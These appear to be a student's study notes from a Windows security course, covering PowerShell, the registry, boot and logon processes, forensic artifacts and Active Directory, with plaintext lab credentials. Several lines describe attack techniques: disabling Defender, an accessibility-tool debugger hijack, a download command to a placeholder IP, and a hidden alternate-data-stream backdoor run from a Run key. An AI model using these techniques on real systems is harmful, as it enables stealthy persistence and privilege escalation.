LOGIN/DAILY SUTFF:
ssh student@10.50.38.82 -Y      (LIN-OPS)   # linop=
xfreerdp /u:student /v:10.50.36.193 /dynamic-resolution +glyph-cache +clipboard   (WIN-OPS)
xfreerdp /u:student /v:10.50.39.203 /dynamic-resolution +glyph-cache +clipboard    (Admin-Station; student:password)
                    File-server (ssh) :10.19.0.3 (andy.dwyer:BurtMacklinFBI)

CTFD: http://10.50.22.25:8000/


-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
QoL Notes:
Start-Transcript -path .\Day1_notes.txt -append       ### save every command and output typed in powershell to new file
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
DAY1: POWERHSLL BASICS
https://os.cybbh.io/public/os/latest/002_powershell/pwsh_fg.html

Get-ChildItem 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Profiles'   # Queries current network profiles.

Remoting Security:
Get-Item WSMan:\localhost\client\TrustedHosts                                      # Query trusted hosts
Set-Item WSMan:\localhost\Client\TrustedHosts -Value "Server01"                    # Adding a single item to TrustedHosts
Set-Item WSMan:\localhost\Client\TrustedHosts -Value "Server01,Server02,127.0.0.1"      # Adding multiple items
                                                     
Set-Item WSMan:\localhost\Client\TrustedHosts -Value "Server03" -Concatenate       # Appends the Value instead of changing it

#temp session:
Invoke-Command -ComputerName File-Server {Get-Service}                                      # Creates 1-to-1 Temporary Session
Invoke-Command -ComputerName File-Server,Domain-Controll,Workstation2 {Get-Service} -asjob  # Running a Temporary Session as a Job 
                                                                        C:\'location of script on our PC'   ; copies over that script to those computers, 
                                                                            executes and displays results on our screen
Receive-Job <job #>                                                                         # Displays the job's Results


new-pssession -computername (-port -name -credential)   ### like ssh to another PC      (name, fqdn, netbios, servername)





------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
DAY2: WINDOWS REGISTRY
https://os.cybbh.io/public/os/latest/004_windows_registry/reg_fg.html
regedit

cd:\
Creating new registies in PWSH: Recommended
Set-MpPreference -DisableRealtimeMonitoring $TRUE$profile

new-item "registry path" -name ".fuk " -force -ErrorAction SilentlyContinue
new-itemproperty "registry path\.fuk" -name '(Default)' -PropertyType String -Value 'exefile' -Force -ErrorAction SilentlyContinue | out-null
new-itemproperty "registry path\.fuk" -name 'Content Type' -propertytype String -Value 'application/x-msdownload' -force -ErrorAction Silentlycontinue | out-null

get-item "new registry path"

Querying:
gci           gets the subkeys, ex 'gci HKLM:\'     'gxi HKLM:\ -recurse' get everything and data/properties
get-itemproperty    
get-item        just the key and not any subitems only entries, ex 'get-item HKLM:\'

Modifying:
set-itemproperty        Set-ISER is the copy of the logged in userâ€™s registemProperty -path <keypath> -name " " -Value " " ; leaves less logs than new-itemproperty (same syntax with new-itemproperty, leaves logs by default   )
remove-itemproperty

get-psdrive         # to see mounts, includes registry roots/hivekeys
add-content -value "new-psdrive -name HKU -psprovider Registry -root HKEY_Users" $profile.AllUsersAllhosts   # mounts that key
^ stuff outside the quotes permanetly adds it                                     &$profile.allusersallhosts
get-item -path registry::Key_Users\*\<path>     # gets all the users info of that path
                HKU:\*\path       ^ does the same thing, but without creating the new psdrive





Using 'reg': Not recommended
reg /?                    #Displays help for all of the reg.exe commands
reg query /?              #Displays help for the `reg query`
reg add /?                #Displays help for `reg add`
reg delete /?             #Displays help for `reg delete`

reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v testme /t REG_SZ /d C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
                                                           /v ;name  /t ; datatype/propertytype /d ; directory that you want the registry to run
reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v testme




Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList
  ### shows all the users who logged in

Priv Esc1:
Set-MpPreference -DisableRealtimeMonitoring $TRUE     ### do this first to allow this 
Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options
  ###new key 'utilman.exe'; stringvalue 'Debugger; modify, valuedata: C:\Windows\System32\cmd.exe 
                                  ###means of persistence, inherits users priv, useful for priv esc,  ->.ie lock the screen then open ease of use
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Alternate Data Streams:
## doesnt acutally modify og file directly, the md5 doesnt change

CMD:
ex1: C:\windows\system32>echo social security numbers > reminder.txt:secret.info
ex2: 
  echo "text" > <file>:<streamfile>     ###creates alt data stream
  notepad <file>:<streamfile>   #views content  
'dir /R' displays the ADS info of a file typically hidden


PWSH: 
ex1: set-Content .\reminder.txt -Value "social security numbers" -Stream secret.info 
PS Get-Item reminder.txt -Stream *  Get-Item with the -Stream option allows us to see 
                                                         all streams for *reminder.txt.
ex2:
  get-item <file> -Stream * or <ads file>
  gci <path> | foreach-object {get-item $_.FullName -Stream *} | where {$_.Stream -ne $DATA} } | get-content
  set-content <path> -Value "txt" -Stream <ads file>
  
add-content -passthru <path> -value 'wget IPADDr:445/file.exe -outfile 'location of file to put' 
persistence:
new-itemproperty -path HKLM...currentversion\run -name 'name' -propertytype String -value 'C:\powerhsell.exe' -windowstyle hidden - noprofile -command "Get-content C:\uploaded backdoor" -stream script | foreach { powershell -windowstyle hidden -noprofile $_ } " -force -erroraction silentlycontinue
                        HKEY_Users...^




------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
DAY4: WINDOWS BOOT PROCESS AND BCD EDIT

Rookit    ### malware tha thide themselves and other applications, typically in kernel mode
Bootkit   ### replaces the OS bootloader to load the bootkit b4 the OS


BOOT:
  https://git.cybbh.space/os/public/raw/master/images/winboot-01.jpg
  https://git.cybbh.space/os/public/raw/master/images/BIOSvsUEFI.png
  Basic pre-boot and boot
    POST - UEFI - GPT - bootmgrfw.efi - BCD - OS Loader/Winloadefi/winresume.efi/ NTOSKRNL
    POST - BIOS - MBR - Volume Boot Sector - Bootloader/bootmgr.exe/ntldr.exe - boot.ini - NTOKRNL

POST (power on self test) first, checks for hardware required for the system to run.
BIOS will only use MBR, UEFI will only use GPT(GUID Partition Table)
UEFI faster than BIOs, easier to update/ptach. Secure Boot: which only allows verified drivers to load. Supports larger drives.

BIOS loads MBR, first 512 bytes. 1 partition table; can only have up to 4 partitions active. Contains disk partitions. 
UEFI reads EFI partition with boot managers. bootmgrfw.efi tells UEFI where the GPT is at.

BIOS winload.exe (cold starts), winresume.exe
    Both have Ntoskrnl.exe
UEFI winload.efi, winresume.efi( hibernation, needs hiberfil.sys to exsist)
      Fast Boots only works for Shutdowns, not restarts
 
After boot managers load winload/winresume, Ntoskrnl starts several kernal/OS processes:
  device drivers, pagefile.sys, directory hives, hal.dll, process manager for system idle process. And smss.exe and csrss.exe for logon etc.
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Win 10 LOGON Process:
https://git.cybbh.space/os/public/raw/master/images/winboot-06.jpg

SYSTEM (pid 4 ), begins this, Idle ( pid 0) is the kernel
PId 0-1000 is systemlevel; for users only smss, csrss and winlogon is only under 1000
Session 0 is for security and high privilege processes such as services (non-interactive)
User subsystem Session 0:

    -smss.exe installs the Win32 subsystem kernel and user mode components (win32k.sys - kernel; winsrv.dll - user; and csrss.exe - user.)
        -csrss.exe - the Client/Server Runtime Subsystem: supports process / thread creation and management. Subsystem processes, like kernel32, user32m, advapi32, win32k.ysy(kernel mode),.dlls.
        -wininit.exe marks itself as critical, initializes the Windows temp directory, loads the rest of the registry, and starts user mode scheduling. It also installs programs that require a reboot to finish the install process. It also starts:
            lsm.exe - the Local Session Manager (LSM): handles all sessions of a system (both remote desktop sessions and local system sessions.)
            lsass.exe - the Local Security Authority Subsystem (LSASS): provides user authentication services, manages the local security policy, and generates access tokens.
            services.exe the Services Control Manager (SCM) loads AutoStart services, using LSASS to authenticate if they run as something other than System.
        -wininit.exe then waits for system shutdown to undo everything it started. 

Session 1 is for the first interactive user (interactive)
User subsystem Session 1:

    Spawn a Session 1 ( or higher) csrss.exe ( each user has one)
    Spawn Winlogon.exe which by default prompts for credentials with logonui.exe      ### service accounts do not have this SAS
         Spawn userinit.exe which creates an account token and creates a custom environment     ### userinit, lauches explorer and kills userinit, has pid of userinit
             Spawn explorer.exe as the customized graphical environment.

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
BCDEDIT:
Native CLI tool to view and manipulate boot configs
  Windows Boot Loader: identifier {current}, the running boot
  
bcdedit /?
bcdedit | findstr /i winload or winresume     ### shows if loaded from cold or hibernation; BIOS or UEFI
msinfo32      ### shows sys summary, devies, boot devices, BIOS mode (UEFI/Legacy), secure boot state
    Boot Device	\Device\HarddiskVolume1
bcdedit /set description "Win 10"   ### changes it
bcdedit /set safeboot minimal/Network     #the former allows safe mode; "Network" allows a basic command shell and network resources like a NIC
bcdedit /set safebootalternateshell   ### allows safe mode to load bash; if no safeboot default is minimal
bcdedit /deletevalue safeboot/sasfebootalternateshell
  -OR-
    msconfig, Boot -> safeboot... (if gui is accessable) 
      uncheck services, custom ones are noted


bcdedit /displayorder {name} /addfirst
shutdown /a



------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
DAY7: WINDOWS PROCESS VALIDITY \USER ACCOUNT CONTROL\ SYSINTERAL TOOLS
virustotal.com (checks hash, owned by google)

process requires some interaction, a service runs in the background with rarely any interaction.
dll: library that contains pointers to resources available for other programs. dlls are handles the binary are using
"svchost.exe -k" always equals a legit service
"conhost.exe" means cli or pwsh



scheduled tasked; good form of persistence


hidden processes, services, and finding normal/abnormal activity:
  get-process SMSS.SCRSS,LSASS | sort -property ID
  
boot processes with descriptions:
  get-process | select name, id, description | sort -property ID

system processes and services that normally run from:
  get-process | select name, id, path
  get-ciminstance win32_service(process) | select name, processid, pathname, commandline, parent processid | ft | out-file $HOME\desktop\services.txt
  get-wmiobject                                               ### these are better for hidden processes
  get-ciminstance Win32_process | select * -first 1
    
priority levels of processes important:
  get-process | select name, priorityclass
  tasklist /m  /v   /svc



how would malware use schedule tasks:
  schtasks /query | more
  get-scheduledtask | select * | select -first 5
  schtasks /query /tn "\microsoft\xblgamesave\xblgamesavetask"  /v /fo list
  
  task scheduler app (copy and paste for schtasks in powershell)


misc:
Get-Process chrome | foreach {$a} {$_.modules} | more

Get-Process -Name "*chrome*" | Select-Object -ExpandProperty Modules | more

Get-Process chrome | foreach {$a} {$_.modules} | Where-Object ModuleName -like '*chrome*' | more

Get-Process -Name "*chrome*" | Select-Object -ExpandProperty Modules | Where-Object ModuleName -like '*chrome*' | more

Get-CimInstance Win32_Process | where {$_.Name -like "*LSASS*"} | select *
    look at process name and name
    
ps -name lsass | select -ExpandProperty modules
    gets handles(dlls) that a process/binary is using
      Get-Process -name lsass | select -ExpandProperty modules | ft -wrap | Out-file C:\Users\student\Desktop\handels.txt -width 4096
      ps -Name lsass | select -ExpandProperty modules | ft -wrap


get-service /sc.exe
sc.exe showsid powershell_ise,power     -need to use service name
sc.exe queryex type=service state=inactive  ### active by default
sc.exe showsid <service name>
 
 
 
Get-WmiObject win32_service |select-object -property * | where-object { $_.Name -Like '*DHCP*'}
                                                      name, description
                                                       | where { $_.displayname -like "*firewall*"} | select name, displayname


get-ciminstance win32_process | select * | select processid, parentproccessid, name ,commandline | out-file <file> -width 2014 | where { $_.name -like "*powershell*"}
                                                                                                                                            .proccessid -like "proccesid"
                                                                                                                                                        -like "parentproccessid"
netstat -anob
 netsh advfirewall show allprofiles
------------------------------------------------------------------------------------------------------------------------------------------------------------------
SYSINTERNALS:

processexplorer (procexp) 
    -collects info on running processes, hierarchical view, live cpu activity, kill and suspend procs, dlls loaded, handles. 
    -tree format
    -better than windows tasks mngr
autoruns
    -shows apps auto started on boot as well as the registry and file system locations for auto-start configs
    -views scheduled tasks, services and image hijacks
processmonitor (procmon)
    -logs boot process
    -shows real-time file sys, registry and process/thread activity
tcpview
    -netstat-like netwiork listing. Dynamic information, refreshes.All tcp, udp endpoints. local and remote addresses.
handle
    -open file references
    -can be used to terminate a handle to a file
    
accesschk
    -effective file permissions
listdlls
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
User Account Control:


-gui only service
  -limits priv of who can run the thing
    reg key : "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
                      -enableLUA

-asinvoker; uses privs of whoever is trying to execute binary
-requireadmin; user must be a builtin admin, or in the group, or known admin creds
-highestavailable; runs with the highest perm level that it can. still prompts

the UAC prompt will show if :
    - bottom two are sysinternal tools
    Auto Elvate is True
        ./strings C:\Windows\System32\*.exe -accepteula | select-string -SimpleMatch "autoelevate"
    Digitally Signed
        ./sigcheck -m C:\Windows\System32\slui.exe -accepteula | Select-String -SimpleMatch "level"
    Trusted Directory
        i.e C:\Windows\System32

uipi/secure desktop
  -protects against shatter attacks
  -cant interact with anything else when prompt comes up.
      concentpromptbehvaioradmin/user
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
DAY9:WINDOWS AUDITING & LOGGING

(STEP1):
Getting User SID:
  get-wmiobject win32_useraccount | select name,sid (PowerShell)    ### local and domain users and SID
 * Get-LocalUser | select Name,SID (PowerShell)       ### local and SIDs
  wmic useraccount get name,sid (CMD.EXE ONLY)      ### cli, or wmic.exe in pwsh


ARTIFACTS:
Userassist:
  userassit reg keys tracks gui-based programs that were ran by a particular user
  view executable Files run:        ### also list of applications,files,links,
      Get-ItemProperty 'REGISTRY::HKEY_USERS\*\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}\Count'
  View Shortcut files executed      ### list shortcut links used to start program
      Get-ItemProperty 'REGISTRY::HKEY_USERS\*\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\{F4E57C4B-2036-45F0-A9AB-443BCFE33D9F}\Count'
   ### Output shows the Executable files encoded with ROT13. Copy/ Paste the output into a decdoer site like Rot13 or CyberChef


Windows Background Activity Moderator (BAM):
  Windows service that controls activity of background applications     ### enabled by default, only for GUIs
    winver, $PSVersionTable
      Get-Itemproperty 'HKLM:\SYSTEM\CurrentControlSet\Services\bam\UserSettings\*' (Windows 1709 & 1803)
      Get-Itemproperty 'HKLM:\SYSTEM\CurrentControlSet\Services\bam\state\UserSettings\*' (Windows 1809 and newer)
                ### if 'C:\' is present, wrong because it was manually put there
                ### tells user acct that ran the entry


Recycle Bin:
  gci "C:\`$Recycle.Bin" -force
  gci 'C:\$RECYCLE.BIN' -Recurse -Verbose -Force | select *
  gci 'C:\$RECYCLE.BIN' -Recurse -Force| foreach-object { if ( ($_.extension) -like ".txt") { if ( $_.Name -like "`$R*" ) { Write-host $_.Name -NoNewLine ; Write-Host " --> " -ForegroundColor Green -NoNewLine ; get-content $_.fullname } } }

  Get-Childitem 'C:\$RECYCLE.BIN' -Recurse -Verbose -Force | select FullName 
              ####wmic useraccount where 'sid="S-1-5-21-1584283910-3275287195-1754958050-1005"' get name   gives user acct name that the SID belongs to
  Get-Content 'C:\$Recycle.Bin\S-1-5-21-1584283910-3275287195-1754958050-1005\$R8QZ1U8.txt'
            ####This is the file for Auditing 

    SID - determines which user deleted it
    Timestamp - When it was deleted
    $RXXXXXX - content of deleted files
    $IXXXXXX - original PATH and name


Prefetch:
  prefetch files ae creted by the windows os sys when an application is ran for the first time from a specific location
  speed up application startup process; only saves files from application that have RAM. Stores last 1024 exes in RAM
      gci -Path 'C:\Windows\Prefetch' -ErrorAction Continue | select * | select -first 5/8/etc


Jump Lists:
### win 7-10, allows users to 'jump' to recently,frequently used files
gci -Recurse C:\Users\*\AppData\Roaming\Microsoft\Windows\Recent -ErrorAction Continue | select FullName, LastAccessTime, creationtime

Win7/8/10
C:\%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Recent\AutomaticDestinations (C:\Users\king\AppData\Roaming\Microsoft\Windows\Recent)
Show in Explorer:
C:\%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Recent\AutomaticDestinations (C:\Users\king\AppData\Roaming\Microsoft\Windows\Recent)


Get-Childitem -Recurse C:\Users\*\AppData\Roaming\Microsoft\Windows\Recent -ErrorAction Continue | select FullName, LastAccessTime
Get-Childitem -Recurse $env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Recent -ErrorAction SilentlyContinue | select FullName,LastAccessTime

-OR-
- Make sure sysinternals is mounted or unzipped
- Gci C:\users\student\AppData\Roaming\Microsoft\Windows\Recent\AutomaticDestinations | % {z:\strings.exe -accepteula $_} >> c:\recentdocs.txt



Recent Files:
tracks last 150 files/folder opened
entry/mod time is last file of a specific extension open

Location of recent files:
    gci 'Registry::Hkey_Users\*\\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs\*'
    HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs\*
    HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs\.txt

queries hex value stored in key:
Get-Item 'Registry::\HKEY_USERS\*\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs\.*'

Convert all of a users values from HEX to Unicode:
Get-Item "REGISTRY::HKEY_USERS\*\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs\.txt" | select -Expand property | ForEach-Object {
    [System.Text.Encoding]::Default.GetString((Get-ItemProperty -Path "REGISTRY::HKEY_USERS\*\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs\.txt" -Name $_)



Browser Artifacts:
  store details for each user acct
  history: records the access to the file on a website accessed via a link
  location:
      %USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default\history

      .\strings.exe 'C:\Users\<username>\AppData\Local\Google\Chrome\User Data\Default\History'
      
  fqdns in sqlite txt files:
      $History = (Get-Content 'C:\users\*\AppData\Local\Google\Chrome\User Data\Default\History') -replace "[^a-zA-Z0-9\.\:\/]",""

      $History| Select-String -Pattern "(https|http):\/\/[a-zA-Z_0-9]+\.\w+[\.]?\w+" -AllMatches|foreach {$_.Matches.Groups[0].Value}| ft

Usernames:
  strings.exe  'C:\users\andy.dwyer\AppData\Local\Google\Chrome\User Data\Default\Login Data'   ###sysinteraltools
Most visited:
  strings.exe 'C:\users\andy.dwyer\AppData\Local\Google\Chrome\User Data\Default\Top Sites'     ###sysinternaltools
Frequency:
  \strings.exe 'C:\users\andy.dwyer\AppData\Local\Google\Chrome\User Data\Default\History' -accepteula


AUDITING:  
event logs: applications, security(valid/invalid logon/offs, deleting files, etc.), system(logs created by system or critical to sys), customlog(logs told to create, even through applications)
auditpol /get /category:*
    gets entire auditpol list
  
auditpol /set/ subcategory:"File System"
                                            /success:disable

Get-EventLog -LogName *
Get-EventLog -LogName Security -Message "*remote*" | ft -wrap
Get-EventLog -LogName System -Newest 10 


get-winevent -FilterHashtable @{logname="security";id="4624"} | select -first 5 | ft -wrap
Get-WinEvent -Listlog *
Get-WinEvent -Listlog * | findstr /i "Security" 
Get-WinEvent Microsoft-Windows-PowerShell/Operational | Where-Object {$_.Message -ilike "*RunspacePool*"} | Format-List
Get-WinEvent Microsoft-Windows-PowerShell/Operational | Where-Object {$_.Message -ilike "*Pipeline ID = ##"} | Format-List 


https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/Default.aspx
User Added to Privileged Group
4728, 4732, 4756
Security-Enabled group Modification
4735
Successful/ Failed User Account Login
4624, 4625
------------------------------------------------------------------------------------------------------------------------------------------------------
DAY12: ACTIVE DIRECTORY

Group Nesting:
    Members in a group can have domain admin prviledges; giving people permissions that they dont need.
  
Never run locally as admin. Log as local regular user then 'runas' . Disable local admin!!
Sus Activity:
  user accounts loggin into critical infrastructure i.e domain controllers.
  active moutside normal work hours
  nested groups, unkown admin accounts
  service accounts loggin into hosts


gpresult  ### group policy object queries
Get-GPResultantSetOfPolicy

get-module ActiveDirectory    
get-command -Module ActiveDirectory

Get-ADDefaultDomainPasswordPolicy
    ### gets pw policies
Get-ADFineGrainedPasswordPolicy -Filter {name -like "*"}
    check for fine-grained password policies
    

gwmi win32_service | where { $_.name -like "adws" -or $_.name -like "kdc" -or $_.name -like "net
logon" -or $_.name -like "dns" } | select name,state,status
    ###gets required services for a domain controller.


Get-ADDomainController/get-ADForest
  ###domain details, forest details

Get-ADdomain army.warriors
 ###queries information for that domain

Get-ADDomainController

Get-ADGroup/Member -Identity 'IA Analysts Team' | "Domain Admins" -Recursive ( | measure ;finds counts)
  Get-ADGroupMember -Identity "Domain Admins" -Recursive | select objectclass | measure
  
  
  
  ###gets group details
    ###Get-ADGroupMember -Identity 'IA Analysts Team' -Recursive
Get-SmbShare
    ###want to see netlogon and sysvol

Get-ADUser -Filter 'Name -like "*"'
     ###queries for AD users
     
Get-ADUser -Identity 'Nina.Webster' -Properties Description   
    ### see additional properties     
     

Get-ADGroup -Filter * | Select Name, GroupCategory, GroupScope

get-aduser -filter * -Properties * | where {$_.AllowReversiblePasswordEncryption -eq $true }        ### searches for specific property from a get-aduser query
 | select name                                 PasswordNotRequired



New-ADUser -Name "Bad Guy" -PasswordNotRequired 1 -Path "OU=3RD LPT,OU=CCO,OU=3RDBN,OU=WARRIORS,DC=ARMY,DC=WARRIORS";   ### '1' means no, '0' means yes

search-AdAccount -accountdisabled | select name
    ###searches for disabled accounts
                -accountexpired
                -accountexpiring     
###TEMPLATE
get-aduser -filter * -Properties * | where {$_.<property> -like "*<paterntomatch>*" } | select name,<other property>
                                              .description -like "*built*in*"

et-aduser -filter * -Properties * | select -first 1     ### will show you all properties to query for w/ command above.

get-aduser -filter * -Properties * | where {$_.officephone -like "*336-6754*"}
